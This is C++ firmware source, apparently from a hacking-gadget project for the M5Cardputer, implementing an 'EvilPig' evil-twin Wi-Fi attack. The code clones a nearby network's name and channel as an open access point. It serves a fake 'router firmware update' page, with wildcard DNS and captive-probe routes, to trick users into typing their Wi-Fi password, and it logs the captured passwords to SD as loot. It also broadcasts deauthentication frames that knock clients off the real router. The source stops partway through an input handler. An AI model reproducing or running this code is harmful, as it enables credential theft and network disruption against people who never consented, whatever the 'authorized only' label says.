// EvilPig — network select + client estimate + softAP clone + deauth kicks
// Deauth uses WSLBypasser (same as OINK). Portal uses WebServer+DNSServer.
// LAB / authorized networks only.

#include "evilpig.h"
#include <M5Cardputer.h>
#include <SD.h>
#include <esp_heap_caps.h>
#include <esp_wifi.h>
#include <string.h>
#include <algorithm>
#include "../ui/display.h"
#include "../ui/keys.h"
#include "../piglet/avatar.h"
#include "../piglet/mood.h"
#include "../core/network_recon.h"
#include "../core/wifi_utils.h"
#include "../core/wsl_bypasser.h"
#include "../core/sdlog.h"
#include "../core/sd_layout.h"
#include "../core/config.h"
#include "../core/app.h"
#include "../core/xp.h"
#include "../audio/sfx.h"
#include "oink.h"  // DetectedNetwork

bool EvilPigMode::running = false;
EvilPigMode::Phase EvilPigMode::phase = EvilPigMode::Phase::SELECT;
EvilPigMode::Phase EvilPigMode::phaseBeforeLoot = EvilPigMode::Phase::SELECT;
bool EvilPigMode::reconWasRunning = false;
bool EvilPigMode::reconWasPaused = false;
WebServer* EvilPigMode::server = nullptr;
DNSServer* EvilPigMode::dns = nullptr;
char EvilPigMode::apSsid[33] = "Router-Update";
uint8_t EvilPigMode::apBssid[6] = {0};
uint8_t EvilPigMode::apChannel = 6;
uint8_t EvilPigMode::targetClients = 0;
bool EvilPigMode::targetPmf = false;
bool EvilPigMode::deauthOn = true;
uint16_t EvilPigMode::hitCount = 0;
uint32_t EvilPigMode::deauthCount = 0;
uint32_t EvilPigMode::lastDeauthMs = 0;
char EvilPigMode::statusMsg[40] = "IDLE";
char EvilPigMode::lastEvent[40] = "-";
uint32_t EvilPigMode::sessionStart = 0;
uint32_t EvilPigMode::lastListRefresh = 0;
EvilPigMode::NetPick EvilPigMode::list[EvilPigMode::MAX_LIST] = {};
uint8_t EvilPigMode::listCount = 0;
uint8_t EvilPigMode::listIdx = 0;
uint8_t EvilPigMode::listScroll = 0;
EvilPigMode::Catch EvilPigMode::catches[EvilPigMode::MAX_CATCH] = {};
uint8_t EvilPigMode::catchCount = 0;
uint8_t EvilPigMode::lootScroll = 0;

static const uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static uint8_t s_prevSoftApClients = 0;

static const uint8_t EP_STA_MAX = 8;
static const uint8_t EP_NET_MAX = 24;
static uint8_t s_epBssid[EP_NET_MAX][6];
static uint8_t s_epCh[EP_NET_MAX];
static uint8_t s_epNets = 0;
static uint8_t s_epSta[EP_NET_MAX][EP_STA_MAX][6];
static uint8_t s_epStaN[EP_NET_MAX];
static volatile bool s_epSniff = false;
static uint8_t s_epHopI = 0;
static uint32_t s_epHopMs = 0;

static int epFindIdx(const uint8_t* bssid) {
    if (!bssid) return -1;
    for (uint8_t i = 0; i < s_epNets; i++) {
        if (memcmp(s_epBssid[i], bssid, 6) == 0) return (int)i;
    }
    return -1;
}

static void epCliClear() {
    memset(s_epStaN, 0, sizeof(s_epStaN));
    memset(s_epSta, 0, sizeof(s_epSta));
}

static void epCliAdd(const uint8_t* bssid, const uint8_t* sta) {
    if (!bssid || !sta) return;
    if (sta[0] & 1) return;
    if (memcmp(sta, bssid, 6) == 0) return;
    int idx = epFindIdx(bssid);
    if (idx < 0) return;
    uint8_t n = s_epStaN[idx];
    for (uint8_t i = 0; i < n; i++) {
        if (memcmp(s_epSta[idx][i], sta, 6) == 0) return;
    }
    if (n >= EP_STA_MAX) return;
    memcpy(s_epSta[idx][n], sta, 6);
    s_epStaN[idx] = (uint8_t)(n + 1);
}

static void epOnRx(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!s_epSniff || type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    if (!pkt || !pkt->payload) return;
    const uint8_t* p = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 24) return;
    uint8_t toDs = (p[1] & 0x01) != 0;
    uint8_t fromDs = (p[1] & 0x02) != 0;
    const uint8_t* bssid = nullptr;
    const uint8_t* sta = nullptr;
    if (toDs && !fromDs) { bssid = p + 4; sta = p + 10; }
    else if (!toDs && fromDs) { bssid = p + 10; sta = p + 4; }
    else { bssid = p + 16; sta = p + 10; }
    epCliAdd(bssid, sta);
}

static void epCliStop() {
    s_epSniff = false;
    WiFiUtils::stopPromiscuous();
}

static void epCliArm(uint8_t n, const uint8_t bssid[][6], const uint8_t* ch) {
    s_epNets = n > EP_NET_MAX ? EP_NET_MAX : n;
    for (uint8_t i = 0; i < s_epNets; i++) {
        memcpy(s_epBssid[i], bssid[i], 6);
        s_epCh[i] = ch[i];
    }
    epCliClear();
    s_epHopI = 0;
    s_epHopMs = millis();
    wifi_promiscuous_filter_t filt{};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&epOnRx);
    esp_wifi_set_promiscuous(true);
    s_epSniff = true;
    if (s_epNets && s_epCh[0] >= 1 && s_epCh[0] <= 13)
        esp_wifi_set_channel(s_epCh[0], WIFI_SECOND_CHAN_NONE);
}

static void epCliTick(uint8_t n, uint8_t* clientsOut) {
    if (!s_epSniff) return;
    uint32_t now = millis();
    if (now - s_epHopMs >= 280 && s_epNets) {
        s_epHopMs = now;
        s_epHopI = (uint8_t)((s_epHopI + 1) % s_epNets);
        uint8_t ch = s_epCh[s_epHopI];
        if (ch >= 1 && ch <= 13) esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    }
    uint8_t lim = n < s_epNets ? n : s_epNets;
    for (uint8_t i = 0; i < lim; i++) clientsOut[i] = s_epStaN[i];
}



static const char PORTAL_HTML[] PROGMEM = R"HTML(
<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Router Update</title>
<style>
body{font-family:system-ui,sans-serif;background:#d0d0d0;margin:0;display:flex;min-height:100vh;align-items:center;justify-content:center}
.box{background:#fff;border-radius:10px;padding:22px;max-width:360px;width:92%;box-shadow:0 2px 12px rgba(0,0,0,.15)}
h1{font-size:1.25rem;margin:0 0 8px;color:#222}
p{color:#555;font-size:.95rem;line-height:1.4}
input{width:100%;padding:12px;margin:12px 0;border:1px solid #ccc;border-radius:6px;box-sizing:border-box;font-size:1rem}
button{width:100%;padding:12px;border:0;border-radius:6px;background:#0b57d0;color:#fff;font-size:1rem}
.ok{display:none;color:#0a0;font-weight:600}
</style></head><body>
<div class="box">
<h1>Router firmware update</h1>
<div id="f">
<p>A critical Wi‑Fi router update is required. Enter the network password to continue.</p>
<form method="POST" action="/post" id="frm">
<input type="password" name="password" placeholder="Wi‑Fi password" required autocomplete="current-password">
<button type="submit">Update now</button>
</form>
</div>
<p class="ok" id="ok">Update queued. The router will restart shortly.</p>
</div>
<script>
document.getElementById('frm').addEventListener('submit',function(){
  setTimeout(function(){
    document.getElementById('f').style.display='none';
    document.getElementById('ok').style.display='block';
  },400);
});
</script>
</body></html>
)HTML";

static const char PORTAL_OK_HTML[] PROGMEM = R"HTML(
<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Update</title>
<style>body{font-family:system-ui,sans-serif;background:#d0d0d0;display:flex;min-height:100vh;align-items:center;justify-content:center}
.box{background:#fff;padding:24px;border-radius:10px;max-width:340px;text-align:center}</style>
</head><body><div class="box"><h2>Update queued</h2>
<p>The router will restart in a few seconds. Please wait.</p></div></body></html>
)HTML";

void EvilPigMode::setStatus(const char* msg) {
    strncpy(statusMsg, msg ? msg : "", sizeof(statusMsg) - 1);
    statusMsg[sizeof(statusMsg) - 1] = '\0';
}

void EvilPigMode::init() {
    running = false;
    phase = Phase::SELECT;
    phaseBeforeLoot = Phase::SELECT;
    hitCount = 0;
    deauthCount = 0;
    deauthOn = true;
    targetClients = 0;
    targetPmf = false;
    apChannel = 6;
    listCount = 0;
    listIdx = 0;
    listScroll = 0;
    lootScroll = 0;
    // keep catches across sessions in RAM until reboot
    memset(apBssid, 0, 6);
    strncpy(apSsid, "Router-Update", sizeof(apSsid) - 1);
    apSsid[sizeof(apSsid) - 1] = '\0';
    setStatus("SELECT");
    strncpy(lastEvent, "-", sizeof(lastEvent) - 1);
}

bool EvilPigMode::ensureHeap() {
    size_t freeH = esp_get_free_heap_size();
    size_t largest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
    Serial.printf("[EVILPIG] heap free=%u largest=%u\n", (unsigned)freeH, (unsigned)largest);
    return freeH >= kMinFreeHeap && largest >= kMinLargest;
}

uint8_t EvilPigMode::getClientCount() {
    if (!running || phase != Phase::PORTAL) return 0;
    return (uint8_t)WiFi.softAPgetStationNum();
}

void EvilPigMode::ensureListVisible() {
    if (listCount == 0) {
        listIdx = 0;
        listScroll = 0;
        return;
    }
    if (listIdx >= listCount) listIdx = listCount - 1;

    // Keep selection inside the visible window (incl. wrap-around)
    if (listIdx < listScroll) {
        listScroll = listIdx;
    } else if (listIdx >= listScroll + VISIBLE) {
        listScroll = listIdx - VISIBLE + 1;
    }

    // Clamp scroll so we never show empty rows past the end
    if (listCount <= VISIBLE) {
        listScroll = 0;
    } else if (listScroll + VISIBLE > listCount) {
        listScroll = listCount - VISIBLE;
    }
}

void EvilPigMode::sortListByRssi() {
    for (uint8_t a = 0; a + 1 < listCount; a++) {
        for (uint8_t b = 0; b + 1 < listCount - a; b++) {
            if (list[b].rssi < list[b + 1].rssi) {
                NetPick tmp = list[b];
                list[b] = list[b + 1];
                list[b + 1] = tmp;
            }
        }
    }
}

// Blocking STA scan — works without OINK/handshake mode. Stops recon first so
// promiscuous + scan don't fight (that path used to fail / look like "error").
uint8_t EvilPigMode::staScanIntoList() {
    listCount = 0;
    epCliStop();
    bool reconWas = NetworkRecon::isRunning() || NetworkRecon::isPaused();
    if (reconWas) {
        NetworkRecon::stop();
        delay(80);
    }

    WiFi.persistent(false);
    WiFi.setSleep(false);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false, false);
    delay(60);

    int n = WiFi.scanNetworks(/*async=*/false, /*hidden=*/true);
    if (n < 0) {
        Serial.printf("[EVILPIG] scan failed code=%d\n", n);
        n = 0;
    }
    for (int i = 0; i < n && listCount < MAX_LIST; i++) {
        String ss = WiFi.SSID(i);
        NetPick& p = list[listCount];
        uint8_t* b = WiFi.BSSID(i);
        if (b) memcpy(p.bssid, b, 6);
        else memset(p.bssid, 0, 6);
        if (ss.length() == 0) {
            strncpy(p.ssid, "[HIDDEN]", sizeof(p.ssid) - 1);
            p.hidden = true;
        } else {
            strncpy(p.ssid, ss.c_str(), sizeof(p.ssid) - 1);
            p.hidden = false;
        }
        p.ssid[sizeof(p.ssid) - 1] = '\0';
        p.rssi = (int8_t)WiFi.RSSI(i);
        p.channel = (uint8_t)WiFi.channel(i);
        if (p.channel < 1 || p.channel > 14) continue;  // 2.4 clone only
        p.clients = 0;
        p.hasPmf = false;
        listCount++;
    }
    WiFi.scanDelete();
    sortListByRssi();
    {
        uint8_t b[EP_NET_MAX][6];
        uint8_t ch[EP_NET_MAX];
        uint8_t n = listCount > EP_NET_MAX ? EP_NET_MAX : listCount;
        for (uint8_t i = 0; i < n; i++) {
            memcpy(b[i], list[i].bssid, 6);
            ch[i] = list[i].channel;
        }
        epCliArm(n, b, ch);
    }
    return listCount;
}

void EvilPigMode::refreshNetworkList() {
    // Preserve selection across auto-refresh (avoid jump-to-top)
    uint8_t keepBssid[6] = {0};
    bool hadSel = (listCount > 0 && listIdx < listCount);
    if (hadSel) memcpy(keepBssid, list[listIdx].bssid, 6);

    listCount = 0;

    // Prefer live NetworkRecon table (has client estimates) when already warm
    if (NetworkRecon::isRunning() || NetworkRecon::isPaused()) {
        auto& nets = NetworkRecon::getNetworks();
        for (size_t i = 0; i < nets.size() && listCount < MAX_LIST; i++) {
            const DetectedNetwork& n = nets[i];
            if (n.channel > 14) continue;  // 2.4 only for clone
            if (n.ssid[0] == '\0' && !n.isHidden) continue;

            NetPick& p = list[listCount];
            memcpy(p.bssid, n.bssid, 6);
            if (n.isHidden || n.ssid[0] == '\0') {
                strncpy(p.ssid, "[HIDDEN]", sizeof(p.ssid) - 1);
            } else {
                strncpy(p.ssid, n.ssid, sizeof(p.ssid) - 1);
            }
            p.ssid[sizeof(p.ssid) - 1] = '\0';
            p.rssi = n.rssiAvg ? n.rssiAvg : n.rssi;
            p.channel = n.channel;
            p.clients = NetworkRecon::estimateClientCount(n);
            p.hasPmf = n.hasPMF;
            p.hidden = n.isHidden;
            listCount++;
        }
        sortListByRssi();
    }

    // Reliable path without OINK: STA scan if recon table empty
    if (listCount == 0) {
        setStatus("SCAN...");
        staScanIntoList();
    }

    // Restore previous selection by BSSID when possible
    listIdx = 0;
    if (hadSel && listCount > 0) {
        for (uint8_t i = 0; i < listCount; i++) {
            if (memcmp(list[i].bssid, keepBssid, 6) == 0) {
                listIdx = i;
                break;
            }
        }
    }
    ensureListVisible();

    lastListRefresh = millis();
    setStatus(listCount ? "SELECT" : "NO NETS");
    Serial.printf("[EVILPIG] list count=%u\n", (unsigned)listCount);
}

void EvilPigMode::applySelection() {
    if (listCount == 0 || listIdx >= listCount) return;
    const NetPick& p = list[listIdx];
    memcpy(apBssid, p.bssid, 6);
    strncpy(apSsid, p.ssid, sizeof(apSsid) - 1);
    apSsid[sizeof(apSsid) - 1] = '\0';
    // Don't use [HIDDEN] as AP name for softAP
    if (p.hidden || strcmp(apSsid, "[HIDDEN]") == 0) {
        strncpy(apSsid, "Router-Update", sizeof(apSsid) - 1);
    }
    apChannel = p.channel;
    if (apChannel < 1 || apChannel > 13) apChannel = 6;
    targetClients = p.clients;
    targetPmf = p.hasPmf;
    deauthOn = !p.hasPmf && Config::radio().deauth;  // PMF → kick mostly useless
    snprintf(lastEvent, sizeof(lastEvent), "SEL %s", apSsid);
}

// Fixed AP IP — don't rely on softAPIP() during early DHCP/captive probes
static const IPAddress kPortalIp(192, 168, 4, 1);
static const IPAddress kPortalMask(255, 255, 255, 0);

void EvilPigMode::sendPortalHeaders() {
    if (!server) return;
    // Critical for Android/iOS captive WebView: no cache, close socket
    server->sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    server->sendHeader("Pragma", "no-cache");
    server->sendHeader("Expires", "0");
    server->sendHeader("Connection", "close");
}

void EvilPigMode::sendPortalPage() {
    if (!server) return;
    sendPortalHeaders();
    server->send_P(200, "text/html", PORTAL_HTML);
}

void EvilPigMode::redirectToRoot() {
    if (!server) return;
    // Hard-code gateway so Location works even if softAPIP() is still 0.0.0.0
    sendPortalHeaders();
    server->sendHeader("Location", "http://192.168.4.1/", true);
    // Body with meta-refresh: some WebViews follow 302 poorly alone
    server->send(302, "text/html",
                 F("<html><head><meta http-equiv='refresh' content='0;url=http://192.168.4.1/'></head>"
                   "<body><a href='http://192.168.4.1/'>Continue</a></body></html>"));
}

void EvilPigMode::handleCaptiveProbe() {
    // Prefer 200 portal HTML over bare 302: modern Android captive sheets
    // open more reliably when the probe itself returns a login page.
    sendPortalPage();
    Avatar::perkUp();
    strncpy(lastEvent, "CAPTIVE", sizeof(lastEvent) - 1);
}

void EvilPigMode::handleRoot() {
    if (!server) return;
    sendPortalPage();
    Avatar::perkUp();
    strncpy(lastEvent, "VIEW", sizeof(lastEvent) - 1);
}

void EvilPigMode::pushCatch(const char* ssid, const String& password, uint8_t ch) {
    if (catchCount < MAX_CATCH) {
        Catch& c = catches[catchCount++];
        strncpy(c.ssid, ssid ? ssid : "?", sizeof(c.ssid) - 1);
        c.ssid[sizeof(c.ssid) - 1] = '\0';
        strncpy(c.pwShow, password.c_str(), sizeof(c.pwShow) - 1);
        c.pwShow[sizeof(c.pwShow) - 1] = '\0';
        c.ch = ch;
    } else {
        // shift left, append
        memmove(&catches[0], &catches[1], sizeof(Catch) * (MAX_CATCH - 1));
        Catch& c = catches[MAX_CATCH - 1];
        strncpy(c.ssid, ssid ? ssid : "?", sizeof(c.ssid) - 1);
        c.ssid[sizeof(c.ssid) - 1] = '\0';
        strncpy(c.pwShow, password.c_str(), sizeof(c.pwShow) - 1);
        c.pwShow[sizeof(c.pwShow) - 1] = '\0';
        c.ch = ch;
    }
}

void EvilPigMode::loadCatchesFromSd() {
    if (!Config::isSDAvailable()) return;
    const char* path = SDLayout::evilpigCredsPath();
    if (!SD.exists(path)) return;
    File f = SD.open(path, FILE_READ);
    if (!f) return;
    // Read last lines into buffer (simple: scan all, keep last MAX_CATCH)
    catchCount = 0;
    while (f.available()) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() == 0 || line.startsWith("ts_ms")) continue;
        // ts,"ssid",bssid,ch,"password"
        int q1 = line.indexOf('"');
        int q2 = line.indexOf('"', q1 + 1);
        int q3 = line.lastIndexOf('"');
        int q4 = line.lastIndexOf('"', q3 - 1);
        if (q1 < 0 || q2 < 0 || q3 <= q2) continue;
        String ss = line.substring(q1 + 1, q2);
        String pw = (q4 > q2) ? line.substring(q4 + 1, q3) : "?";
        // channel before last quote pair
        int ch = 0;
        int cpos = line.lastIndexOf(',', q4);
        int cpos2 = line.lastIndexOf(',', cpos - 1);
        if (cpos2 > 0 && cpos > cpos2) ch = line.substring(cpos2 + 1, cpos).toInt();
        pushCatch(ss.c_str(), pw, (uint8_t)ch);
    }
    f.close();
}

void EvilPigMode::openLoot() {
    phaseBeforeLoot = phase;
    loadCatchesFromSd();
    lootScroll = 0;
    phase = Phase::LOOT;
}

void EvilPigMode::handlePost() {
    if (!server) return;
    String pw;
    if (server->hasArg("password")) pw = server->arg("password");
    else if (server->hasArg("pass")) pw = server->arg("pass");
    else if (server->hasArg("pwd")) pw = server->arg("pwd");
    else {
        for (int i = 0; i < server->args(); i++) {
            if (server->arg(i).length() > 0) { pw = server->arg(i); break; }
        }
    }
    if (pw.length() > 0) {
        saveSubmission(pw);
        pushCatch(apSsid, pw, apChannel);
        hitCount++;
        XP::addXP(XPEvent::EVILPIG_CATCH);  // +40 + lifetime counter
        snprintf(lastEvent, sizeof(lastEvent), "+1 HIT");
        Avatar::triggerSparkles(5);
        Avatar::setState(AvatarState::EXCITED);
        SFX::play(SFX::HANDSHAKE);
        Display::notify(NoticeKind::STATUS, "CAUGHT", 1500, NoticeChannel::TOP_BAR);
    }
    sendPortalHeaders();
    server->send_P(200, "text/html", PORTAL_OK_HTML);
}

void EvilPigMode::handleNotFound() {
    if (!server) return;
    if (server->args() > 0 &&
        (server->hasArg("password") || server->hasArg("pass") || server->hasArg("pwd"))) {
        handlePost();
        return;
    }
    // Any unknown host/path (DNS spoofed) → portal page.
    // Do NOT return 204/Success or phones think the network is online.
    handleCaptiveProbe();
}

void EvilPigMode::saveSubmission(const String& password) {
    if (!Config::isSDAvailable()) return;
    SDLayout::ensureDirs();
    const char* path = SDLayout::evilpigCredsPath();
    bool needHeader = !SD.exists(path);
    File f = SD.open(path, FILE_APPEND);
    if (!f) return;
    if (needHeader) f.println("ts_ms,ap_ssid,bssid,channel,password");
    String safe = password;
    safe.replace(",", ";");
    safe.replace("\n", " ");
    safe.replace("\r", " ");
    char bssidStr[20];
    snprintf(bssidStr, sizeof(bssidStr), "%02X%02X%02X%02X%02X%02X",
             apBssid[0], apBssid[1], apBssid[2], apBssid[3], apBssid[4], apBssid[5]);
    char line[320];
    snprintf(line, sizeof(line), "%lu,\"%s\",%s,%u,\"%s\"",
             (unsigned long)millis(), apSsid, bssidStr, (unsigned)apChannel, safe.c_str());
    f.println(line);
    f.close();
    SDLog::log("EVILPIG", "saved submit len=%u", (unsigned)password.length());
}

void EvilPigMode::setupRoutes() {
    if (!server) return;
    server->on("/", HTTP_GET, handleRoot);
    server->on("/", HTTP_POST, handleRoot);
    server->on("/index.html", HTTP_GET, handleRoot);
    server->on("/post", HTTP_POST, handlePost);
    server->on("/post", HTTP_GET, handleRoot);

    // Android captive (must NOT be empty 204 — that = "internet OK")
    server->on("/generate_204", HTTP_GET, handleCaptiveProbe);
    server->on("/generate_204", HTTP_POST, handleCaptiveProbe);
    server->on("/gen_204", HTTP_GET, handleCaptiveProbe);
    server->on("/gen_204", HTTP_POST, handleCaptiveProbe);
    // iOS / macOS
    server->on("/hotspot-detect.html", HTTP_GET, handleCaptiveProbe);
    server->on("/library/test/success.html", HTTP_GET, handleCaptiveProbe);
    // Windows
    server->on("/ncsi.txt", HTTP_GET, handleCaptiveProbe);
    server->on("/connecttest.txt", HTTP_GET, handleCaptiveProbe);
    server->on("/redirect", HTTP_GET, handleCaptiveProbe);
    // Kindle / misc
    server->on("/success.txt", HTTP_GET, handleCaptiveProbe);
    server->on("/canonical.html", HTTP_GET, handleCaptiveProbe);
    server->on("/fwlink", HTTP_GET, handleCaptiveProbe);
    // Firefox / Ubuntu
    server->on("/canonical.html", HTTP_ANY, handleCaptiveProbe);
    server->on("/success.txt", HTTP_ANY, handleCaptiveProbe);

    server->onNotFound(handleNotFound);
}

void EvilPigMode::servicePortalNet() {
    // Pump DNS + HTTP several times so captive probes don't time out
    for (int i = 0; i < 6; i++) {
        if (dns) dns->processNextRequest();
        if (server) server->handleClient();
    }
}

bool EvilPigMode::startPortal() {
    applySelection();
    epCliStop();

    // Own the radio cleanly — do not depend on OINK having run first
    NetworkRecon::stop();
    WiFiUtils::stopPromiscuous();
    NetworkRecon::freeNetworks();
    delay(80);

    // Soft reset WiFi stack into a known state before softAP
    WiFi.persistent(false);
    WiFi.setSleep(false);
    WiFi.mode(WIFI_OFF);
    delay(80);
    if (Config::radio().randomMac) WSLBypasser::randomizeMAC();

    if (!ensureHeap()) {
        // One more free + wait for heap to coalesce (common without prior OINK brew)
        delay(120);
        if (!ensureHeap()) {
            setStatus("LOW HEAP");
            Serial.printf("[EVILPIG] LOW HEAP free=%u largest=%u\n",
                          (unsigned)esp_get_free_heap_size(),
                          (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
            return false;
        }
    }

    // APSTA: softAP portal + STA iface for raw deauth TX
    WiFi.mode(WIFI_AP_STA);
    delay(120);
    // STA must not keep old association / DHCP — confuses phone routing
    WiFi.disconnect(true, true);
    delay(40);
    esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);

    // Gateway = AP IP so DHCP gives clients a captive route
    WiFi.softAPConfig(kPortalIp, kPortalIp, kPortalMask);

    bool ok = WiFi.softAP(apSsid, nullptr, apChannel, 0, 8);
    if (!ok) {
        Serial.printf("[EVILPIG] softAP fail ch=%u, retry ch6\n", (unsigned)apChannel);
        apChannel = 6;
        delay(50);
        esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
        ok = WiFi.softAP(apSsid, nullptr, apChannel, 0, 8);
    }
    if (!ok) {
        setStatus("AP FAIL");
        return false;
    }
    // Lock channel again after softAP
    esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
    delay(200);

    // Wait until AP IP is live (DHCP / captive depend on it)
    {
        uint32_t t0 = millis();
        while (WiFi.softAPIP() != kPortalIp && (millis() - t0) < 1500) {
            delay(30);
            yield();
        }
    }

    if (!dns) dns = new DNSServer();
    if (!server) server = new WebServer(HTTP_PORT);
    if (!dns || !server) {
        setStatus("OOM");
        return false;
    }

    // Fresh routes if restarting portal without full process reboot
    server->stop();
    delay(20);

    // Wildcard DNS → every name resolves to portal AP (HTTP captive only)
    dns->stop();
    dns->setErrorReplyCode(DNSReplyCode::NoError);
    dns->setTTL(0);  // no cache on clients when possible
    dns->start(DNS_PORT, "*", kPortalIp);
    setupRoutes();
    server->begin();

    WSLBypasser::init();
    phase = Phase::PORTAL;
    sessionStart = millis();
    lastDeauthMs = 0;
    hitCount = 0;
    deauthCount = 0;
    s_prevSoftApClients = 0;
    setStatus(deauthOn ? "PORTAL+DEAUTH" : "PORTAL");
    snprintf(lastEvent, sizeof(lastEvent), "UP %s", apSsid);
    Serial.printf("[EVILPIG] portal SSID='%s' ch=%u ip=%s deauth=%d pmf=%d\n",
                  apSsid, (unsigned)apChannel, WiFi.softAPIP().toString().c_str(),
                  (int)deauthOn, (int)targetPmf);
    return true;
}

void EvilPigMode::stopServers() {
    if (server) {
        server->stop();
        delete server;
        server = nullptr;
    }
    if (dns) {
        dns->stop();
        delete dns;
        dns = nullptr;
    }
    WiFi.softAPdisconnect(true);
}

void EvilPigMode::tickDeauth() {
    if (!deauthOn || phase != Phase::PORTAL) return;
    // Need valid BSSID
    bool zero = true;
    for (int i = 0; i < 6; i++) if (apBssid[i]) { zero = false; break; }
    if (zero) return;

    uint32_t now = millis();
    if (now - lastDeauthMs < 280) return;  // ~3.5 Hz — effective, not spam-hell
    lastDeauthMs = now;

    // Broadcast deauth + disassoc (kick everyone off real AP)
    if (WSLBypasser::sendDeauthFrame(apBssid, apChannel, BROADCAST_MAC, 0x07)) {
        deauthCount++;
    }
    WSLBypasser::sendDisassocFrame(apBssid, apChannel, BROADCAST_MAC, 0x08);
    // Keep softAP channel
    esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);

    if ((deauthCount % 20) == 1) {
        Avatar::waveRipple(WaveMode::OUTGOING, 2);
        snprintf(lastEvent, sizeof(lastEvent), "KICK x%lu", (unsigned long)deauthCount);
    }
}

void EvilPigMode::start() {
    Serial.println("[EVILPIG] Starting...");
    init();

    bool ok = Display::showConfirmBox(
        "EVILPIG LAB",
        "AUTHORIZED NET ONLY\nselect AP, clone+portal\n+kick clients off real AP");
    if (!ok) {
        running = false;
        return;
    }

    reconWasRunning = NetworkRecon::isRunning();
    reconWasPaused = NetworkRecon::isPaused();

    // Prefer STA scan first (works without OINK). Recon optional for client counts.
    // If recon already warm (after OINK), refresh will use its table.
    if (NetworkRecon::isRunning() || NetworkRecon::isPaused()) {
        delay(200);
        refreshNetworkList();
        // If recon still empty (cold table), force clean STA scan
        if (listCount == 0) {
            setStatus("SCAN...");
            staScanIntoList();
            lastListRefresh = millis();
            setStatus(listCount ? "SELECT" : "NO NETS");
            ensureListVisible();
        }
    } else {
        // Cold start: do not require handshake mode — clean STA scan
        setStatus("SCAN...");
        staScanIntoList();
        lastListRefresh = millis();
        listIdx = 0;
        ensureListVisible();
        setStatus(listCount ? "SELECT" : "NO NETS");
        // Optional: start recon in background for later client estimates
        NetworkRecon::start();
    }

    phase = Phase::SELECT;
    running = true;
    Avatar::setState(AvatarState::HUNTING);
    Mood::setDialogueLock(true);
    Mood::setStatusMessage("");
    Display::clearBottomOverlay();
    Display::notify(NoticeKind::STATUS, "SELECT", 1200, NoticeChannel::TOP_BAR);
    SDLog::log("EVILPIG", "select phase nets=%u", (unsigned)listCount);
}

void EvilPigMode::stop() {
    if (!running && !server && !dns) return;
    Serial.println("[EVILPIG] Stopping...");
    running = false;
    phase = Phase::SELECT;
    setStatus("STOP");

    epCliStop();
    stopServers();
    NetworkRecon::stop();
    WiFiUtils::shutdown();

    if (reconWasRunning) {
        NetworkRecon::start();
    } else if (reconWasPaused) {
        NetworkRecon::start();
        NetworkRecon::pause();
    }
    reconWasRunning = false;
    reconWasPaused = false;

    Avatar::setState(AvatarState::NEUTRAL);
    Mood::setStatusMessage("");
    Mood::setDialogueLock(false);
    Display::clearBottomOverlay();
    SDLog::log("EVILPIG", "stop hits=%u deauth=%lu", (unsigned)hitCount, (unsigned long)deauthCount);
}

void EvilPigMode::handleInputSelect() {
    static bool keyWas = false;
    if (!M5Cardputer.Keyboard.isChange() && !M5Cardputer.Keyboard.isPressed()) {
        keyWas = false;
        return;
    }

    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
        if (!keyWas && listCount > 0) {
            keyWas = true;
            if (listIdx == 0) listIdx = listCount - 1;
            else listIdx--;
            ensureListVisible();
        }
        return;
    }
    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
        if (!keyWas && listCount > 0) {
            keyWas = true;
            listIdx = (listIdx + 1) % listCount;
            ensureListVisible();
        }
        return;
    }
    if (M5Cardputer.Keyboard.isKeyPressed('r') || M5Cardputer.Keyboard.isKeyPressed('R')) {
        if (!keyWas) {
            keyWas = true;
            refreshNetworkList();
        }
        return;
    }
    if (M5Cardputer.Keyboard.isKeyPressed('v') || M5Cardputer.Keyboard.isKeyPressed('V')) {
        if (!keyWas) {
            keyWas = true;
            openLoot();
        }
        return;
    }
    if (keyEsc()) {
        if (!keyWas) {
            keyWas = true;
            stop();
        }
        return;
    }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        if (!keyWas && listCount > 0) {
            keyWas = true;
            applySelection();
            char msg[40];
            snprintf(msg, sizeof(msg), "%s ?", apSsid);
            if (!Display::showConfirmBox("CLONE+KICK", msg)) return;
            if (!startPortal()) {
                // Show real reason (LOW HEAP / AP FAIL / OOM) instead of generic FAIL
                Display::notify(NoticeKind::ERROR, statusMsg, 2500, NoticeChannel::TOP_BAR);
                Display::showToast(statusMsg);
                if (!NetworkRecon::isRunning()) NetworkRecon::start();
                phase = Phase::SELECT;
                refreshNetworkList();
                return;
            }
            Avatar::setState(AvatarState::HAPPY);
            Display::notify(NoticeKind::STATUS, "PORTAL ON", 2000, NoticeChannel::TOP_BAR);
        }
        return;
    }
    if (!M5Cardputer.Keyboard.isPressed()) keyWas = false;
}

void EvilPigMode::handleInputPortal() {
    static bool keyWas = false;
    if (!M5Cardputer.Keyboard.isChange() && !M5Cardputer.Keyboard.isPressed()) {
        keyWas = false;
        return;
    }
    if (M5Cardputer.Keyboard.isKeyPressed('k') || M5Cardputer.Keyboard.isKeyPressed('K')) {
        if (!keyWas) {
            keyWas = true;
            if (!targetPmf) {
                deauthOn = !deauthOn;
                setStatus(deauthOn ? "KICK ON" : "KICK OFF");
            }
        }
        return;
    }
